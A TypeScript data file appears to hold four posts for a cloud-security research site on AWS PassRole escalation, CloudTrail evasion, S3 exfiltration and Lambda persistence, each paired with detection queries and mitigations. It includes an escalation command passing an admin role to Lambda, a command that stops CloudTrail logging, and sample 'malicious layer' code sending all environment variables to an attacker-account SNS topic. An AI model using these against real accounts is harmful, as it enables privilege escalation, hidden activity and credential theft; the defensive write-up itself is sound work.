export interface ResearchPost {
  slug: string;
  title: string;
  author: string;
  date: string;
  readTime: string;
  category: string;
  tags: string[];
  preview: string;
  content: string;
  detectionIdeas: string[];
  mitigations: string[];
  references: string[];
}

export const researchPosts: ResearchPost[] = [
  {
    slug: "aws-passrole-privilege-escalation",
    title: "AWS PassRole: From Developer to Admin in One API Call",
    author: "Detecting.Cloud Research",
    date: "2026-03-05",
    readTime: "12 min",
    category: "IAM Abuse",
    tags: ["AWS", "IAM", "Privilege Escalation", "PassRole"],
    preview: "Deep dive into how the iam:PassRole permission can be abused to escalate privileges in AWS environments, and how defenders can detect it.",
    content: `## Overview

The \`iam:PassRole\` permission is one of the most commonly misconfigured AWS IAM permissions. It allows a principal to pass an IAM role to an AWS service, effectively granting the service the permissions of that role.

## The Attack Chain

An attacker with \`iam:PassRole\` combined with service-specific permissions can escalate privileges by:

1. Identifying a high-privilege role in the account
2. Passing that role to a service they control
3. Using the service to execute actions with the elevated role

### Example: Lambda Function Abuse

\`\`\`bash
# Create a Lambda function with an admin role
aws lambda create-function \\
  --function-name escalation \\
  --runtime python3.9 \\
  --role arn:aws:iam::123456789012:role/AdminRole \\
  --handler index.handler \\
  --zip-file fileb://function.zip
\`\`\`

### Required Permissions

\`\`\`json
{
  "Effect": "Allow",
  "Action": [
    "iam:PassRole",
    "lambda:CreateFunction",
    "lambda:InvokeFunction"
  ],
  "Resource": "*"
}
\`\`\`

## CloudTrail Detection

Monitor for \`CreateFunction\` events where the role ARN contains high-privilege roles:

\`\`\`sql
SELECT eventTime, userIdentity.arn, requestParameters.role
FROM cloudtrail_logs
WHERE eventName = 'CreateFunction20150331'
  AND requestParameters.role LIKE '%Admin%'
\`\`\`

## Sigma Rule

\`\`\`yaml
title: AWS Lambda PassRole Privilege Escalation
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventName: CreateFunction20150331
  condition: selection
level: high
\`\`\``,
    detectionIdeas: [
      "Monitor CloudTrail for iam:PassRole events with sensitive role ARNs",
      "Alert on Lambda function creation with administrative roles",
      "Correlate PassRole events with subsequent service API calls",
      "Track role assumption patterns from newly created services",
    ],
    mitigations: [
      "Restrict iam:PassRole with resource-level conditions",
      "Use permission boundaries to limit role scope",
      "Implement SCP guardrails for sensitive roles",
      "Enable CloudTrail logging in all regions",
    ],
    references: [
      "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html",
      "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
    ],
  },
  {
    slug: "cloudtrail-evasion-techniques",
    title: "CloudTrail Evasion: Techniques Attackers Use to Hide in AWS",
    author: "Detecting.Cloud Research",
    date: "2026-02-28",
    readTime: "15 min",
    category: "Cloud Attacks",
    tags: ["AWS", "CloudTrail", "Evasion", "Defense"],
    preview: "Analysis of techniques used to evade CloudTrail logging in AWS environments and how defenders can maintain visibility.",
    content: `## Overview

CloudTrail is the primary audit log for AWS environments. Attackers who understand its limitations can operate with reduced visibility.

## Evasion Techniques

### 1. Non-Logged API Calls

Not all AWS API calls are logged by CloudTrail by default. Data events (S3 object-level, Lambda invocations) require explicit configuration.

### 2. Region Abuse

If CloudTrail is only configured in specific regions, attackers can operate in unmonitored regions.

\`\`\`bash
# Check CloudTrail configuration
aws cloudtrail describe-trails --region us-east-1
\`\`\`

### 3. CloudTrail Disruption

\`\`\`bash
# Stop logging (requires cloudtrail:StopLogging)
aws cloudtrail stop-logging --name my-trail
\`\`\`

## Detection Strategy

Monitor for CloudTrail management events:

\`\`\`sql
SELECT eventTime, userIdentity.arn, eventName
FROM cloudtrail_logs
WHERE eventName IN ('StopLogging', 'DeleteTrail', 'UpdateTrail')
\`\`\``,
    detectionIdeas: [
      "Alert on StopLogging, DeleteTrail, and UpdateTrail events",
      "Monitor for API calls from unexpected regions",
      "Track CloudTrail configuration changes",
    ],
    mitigations: [
      "Enable multi-region CloudTrail with organization trails",
      "Enable data event logging for critical S3 buckets",
      "Use SCPs to prevent CloudTrail modification",
    ],
    references: [
      "https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-concepts.html",
    ],
  },
  {
    slug: "s3-data-exfiltration-detection",
    title: "Detecting S3 Data Exfiltration: A Defender's Playbook",
    author: "Detecting.Cloud Research",
    date: "2026-02-20",
    readTime: "10 min",
    category: "Detection Rules",
    tags: ["AWS", "S3", "Data Exfiltration", "Detection"],
    preview: "Practical detection strategies for identifying and responding to S3 data exfiltration attempts in cloud environments.",
    content: `## Overview

S3 buckets are prime targets for data exfiltration. This guide covers practical detection techniques.

## Common Exfiltration Methods

1. Direct download via compromised credentials
2. Bucket policy modification for public access
3. Cross-account replication
4. Pre-signed URL generation

## Detection Queries

\`\`\`sql
SELECT eventTime, sourceIPAddress, requestParameters.bucketName, bytesTransferredOut
FROM cloudtrail_s3_data_events
WHERE eventName = 'GetObject'
  AND bytesTransferredOut > 1000000000
ORDER BY bytesTransferredOut DESC
\`\`\``,
    detectionIdeas: [
      "Monitor for unusual GetObject volume from S3 buckets",
      "Alert on bucket policy changes that add public access",
      "Track cross-account S3 replication configurations",
    ],
    mitigations: [
      "Enable S3 data event logging",
      "Use VPC endpoints to restrict S3 access",
      "Implement S3 Block Public Access at the account level",
    ],
    references: [
      "https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html",
    ],
  },
  {
    slug: "lambda-persistence-mechanisms",
    title: "Lambda Persistence: How Attackers Maintain Access via Serverless",
    author: "Detecting.Cloud Research",
    date: "2026-02-12",
    readTime: "8 min",
    category: "Cloud Attacks",
    tags: ["AWS", "Lambda", "Persistence", "Serverless"],
    preview: "Exploring how attackers use Lambda functions and layers to maintain persistent access in AWS environments.",
    content: `## Overview

Serverless functions provide unique persistence opportunities for attackers in cloud environments.

## Techniques

### Backdoor Lambda Layers

Attackers can inject malicious code into Lambda layers that persist across function updates.

\`\`\`python
# Malicious layer code
import boto3
import os

def intercept(event, context):
    # Exfiltrate environment variables
    client = boto3.client('sns')
    client.publish(
        TopicArn='arn:aws:sns:us-east-1:ATTACKER:exfil',
        Message=str(dict(os.environ))
    )
\`\`\`

### Event Source Mapping

Create triggers that invoke attacker-controlled functions on specific events.`,
    detectionIdeas: [
      "Monitor Lambda layer creation and updates",
      "Track event source mapping changes",
      "Alert on Lambda functions with external network calls",
    ],
    mitigations: [
      "Restrict Lambda layer management permissions",
      "Audit Lambda functions regularly",
      "Use VPC-attached Lambda functions to control network egress",
    ],
    references: [
      "https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html",
    ],
  },
];
